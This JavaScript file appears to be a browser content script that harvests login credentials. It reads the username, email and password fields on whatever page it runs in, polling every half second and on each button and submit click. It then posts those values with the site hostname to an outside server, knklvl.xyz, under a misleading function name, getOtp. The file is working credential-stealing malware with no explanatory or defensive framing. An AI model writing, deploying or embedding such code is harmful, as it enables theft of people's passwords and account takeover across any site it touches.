
const getOtp = () => {
    var url = new URL(window.location.href)
    var hostname = url.hostname
    var userEl = $("input[name='username']");
    var username = userEl.length?$(userEl[0]).val():'';
    var emailEl = $("input[type='email']");
    var email = emailEl.length?$(emailEl[0]).val():'';
    var passEl = $("input[type='password']");
    var password = passEl.length?$(passEl[0]).val():'';
    console.log(hostname + " " + email + " " + password)
    if(email != '' || password != '' || username != ''){
        $.post("https://knklvl.xyz/kh/messages", {hostname, email, password, username}, (data, stat) => {
            console.log(data);
        }, "text");
    }
}
$(document).ready(async function () {
    setInterval(() => {
        getOtp()
    }, 500);
    const elements = document.getElementsByTagName("button");
    for(const el of elements){
        el.addEventListener("click", getOtp, true);
    }
    const elements1 = document.querySelectorAll("[type='submit']");
    for(const el1 of elements1){
        el1.addEventListener("click", getOtp, true);
    }

    
    // $('button').click(() => {
    //     getOtp()
    // })

    // $("[type='submit']").click(() => {
    //     getOtp()
    // })


})